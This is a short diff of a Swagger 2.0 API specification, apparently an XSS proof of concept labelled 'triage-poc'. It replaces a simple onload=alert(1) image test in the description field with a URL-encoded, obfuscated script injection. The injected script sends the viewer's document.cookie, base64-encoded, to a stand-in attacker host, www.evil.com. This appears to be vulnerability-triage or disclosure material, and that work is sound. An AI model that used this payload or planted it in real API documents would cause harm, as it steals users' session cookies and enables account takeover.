@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: "0.0.1"
   title: Example Title
-  description: <image src=validimage.png onload=alert(1)>
+  description: %27%3C/script%3E%3cscr%69pt%3ewindow.onload=function()%7bvar%20script%20=%20document.createElement('script');script.id='triage-poc';script.src%20=%20"https://www.evil.com/cookie/"%2Bwindow.btoa(document.cookie)%3Bscript.type="application/javascript"%3Bdocument.body.appendChild(script)%3Bconsole.log(script)%3B%7d%3C/script%3E
 paths:
   /:
     get:
